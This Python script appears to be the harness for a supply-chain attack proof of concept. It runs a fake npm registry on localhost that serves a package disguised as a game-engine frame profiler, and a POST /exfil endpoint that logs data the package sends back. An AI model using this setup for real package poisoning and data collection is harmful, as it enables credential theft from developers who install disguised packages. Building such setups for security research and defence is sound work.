#!/usr/bin/env python3
"""Localhost fake npm registry + exfil sink for the PoC.

Routes:
  GET  /@engine-tools/frame-profiler      -> packument JSON (metadata)
  GET  /tarballs/<file>.tgz               -> package tarball bytes
  POST /exfil                             -> canary sink, appended to exfil.log

Binds 127.0.0.1 only. Nothing is ever published to a real registry.
"""
import http.server
import json
import os
import time

HERE = os.path.dirname(os.path.abspath(__file__))
LOG = os.path.join(HERE, "exfil.log")
TARBALL = os.path.join(HERE, "frame-profiler-1.0.0.tgz")
PKG = "@engine-tools/frame-profiler"
PORT = int(os.sys.argv[1]) if len(os.sys.argv) > 1 else 8799


def packument(base):
    return {
        "name": PKG,
        "dist-tags": {"latest": "1.0.0"},
        "versions": {
            "1.0.0": {
                "name": PKG,
                "version": "1.0.0",
                "description": "Headless frame-time profiler for pure-sim game engines.",
                "license": "MIT",
                "bin": {"frame-profiler": "index.js"},
                "dist": {
                    "tarball": f"{base}/tarballs/frame-profiler-1.0.0.tgz",
                    "shasum": "b9f05afb892cac5e01024bcc365044d2fe2a96d6",
                },
            }
        },
    }


class Svc(http.server.BaseHTTPRequestHandler):
    def _send(self, code, body, ctype="application/json"):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        base = f"http://127.0.0.1:{PORT}"
        if self.path in ("/" + PKG, "/" + PKG.replace("/", "%2f"), "/" + PKG.replace("/", "%2F")):
            print(f"[registry] packument {PKG}", flush=True)
            self._send(200, json.dumps(packument(base)).encode())
        elif self.path.startswith("/tarballs/"):
            with open(TARBALL, "rb") as f:
                data = f.read()
            print(f"[registry] tarball {self.path} ({len(data)} bytes)", flush=True)
            self._send(200, data, "application/octet-stream")
        else:
            self._send(404, b"{}")

    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(n)
        with open(LOG, "ab") as f:
            f.write(b"=== %s %s %d bytes ===\n" % (time.strftime("%FT%T").encode(), self.path.encode(), n))
            f.write(body + b"\n")
        print(f"[exfil] {self.path} {n} bytes -> {LOG}", flush=True)
        self._send(200, b"ok", "text/plain")

    def log_message(self, *a):
        pass


print(f"[registry] serving {PKG} + exfil sink on 127.0.0.1:{PORT}", flush=True)
http.server.HTTPServer(("127.0.0.1", PORT), Svc).serve_forever()
